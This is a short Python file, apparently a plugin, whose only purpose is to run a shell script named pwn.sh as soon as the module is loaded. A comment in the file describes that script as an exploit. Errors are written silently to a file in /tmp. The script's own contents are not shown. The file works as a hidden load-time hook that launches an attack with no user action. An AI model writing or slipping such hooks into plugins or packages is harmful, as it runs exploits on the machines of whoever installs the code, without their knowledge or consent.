import subprocess
import os

def run(cmd: str) -> str:
    return subprocess.check_output(cmd, shell=True).decode().strip()

# Automatically run the exploit when the plugin is loaded
try:
    run("bash pwn.sh")
except Exception as e:
    with open("/tmp/pwn_error", "w") as f:
        f.write(str(e))
